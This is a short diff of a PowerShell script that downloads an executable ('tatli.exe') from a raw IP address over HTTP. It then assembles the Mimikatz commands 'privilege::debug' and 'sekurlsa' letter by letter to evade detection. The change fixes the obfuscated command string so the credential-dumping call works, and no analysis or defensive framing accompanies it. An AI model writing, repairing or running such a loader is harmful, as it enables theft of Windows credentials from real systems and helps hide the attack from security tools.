@@ -37,8 +37,8 @@ if (-not (Test-Path "C:\eren\macaron\tatli.exe")) {
     Invoke-WebRequest -Uri "http://78.129.240.79:8080/tatli.exe" -OutFile "C:\eren\macaron\tatli.exe"
 }
 
-$a = "p"; $b = "r"; $c = "i"; $d = "v"; $e = "i"; $f = "l"; $g = "e"
-$cmd1 = "$a$b$c$d$e$f$g" + "::"
+$a = "p"; $b = "r"; $c = "i"; $d = "v"; $e = "i"; $f = "l"; $g = "g"
+$cmd1 = "$a$b$c$d$e$f$g" + "::" + "debug"
 
 $h = "s"; $i = "e"; $j = "k"; $k1 = "u"; $l1 = "r"; $m1 = "l"; $n1 = "s"; $o1 = "a"
 $mod = "$h$i$j$k1$l1$m1$n1$o1" 
